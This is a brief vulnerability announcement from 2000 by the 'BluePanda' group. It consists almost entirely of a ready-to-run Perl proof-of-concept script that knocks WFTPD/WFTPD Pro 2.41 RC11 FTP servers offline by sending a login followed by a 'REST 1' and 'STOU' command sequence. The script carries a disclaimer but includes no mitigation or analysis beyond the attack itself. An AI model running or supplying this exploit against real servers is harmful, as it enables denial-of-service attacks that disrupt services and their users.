================================================================
BluePanda Vulnerability Announcement: WFTPD/WFTPD Pro 2.41 RC11
21/07/2000 (dd/mm/yyyy)

bluepanda@dwarf.box.sk
http://bluepanda.box.sk/
#!/usr/bin/perl
#
# WFTPD/WFTPD Pro 2.41 RC11 denial-of-service #2
# Blue Panda - bluepanda@dwarf.box.sk
# http://bluepanda.box.sk/
#
# ----------------------------------------------------------
# Disclaimer: this file is intended as proof of concept, and
# is not intended to be used for illegal purposes. I accept
# no responsibility for damage incurred by the use of it.
# ----------------------------------------------------------
#

use IO::Socket;

$host = "ftp.host.com" ;
$port = "21";
$user = "anonymous";
$pass = "p\@nda";
$wait = 10;

# Connect to server.
print "Connecting to $host:$port...";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>$port) || die "failed.\n";
print "done.\n";

print $socket "USER $user\nPASS $pass\nREST 1\nSTOU\n";

# Wait a while, just to make sure the commands have arrived.
print "Waiting...";
$time = 0;
while ($time < $wait) {
        sleep(1);
        print ".";
        $time += 1;
}

# Finished.
close($socket);
print "\nConnection closed. Finished.\n"
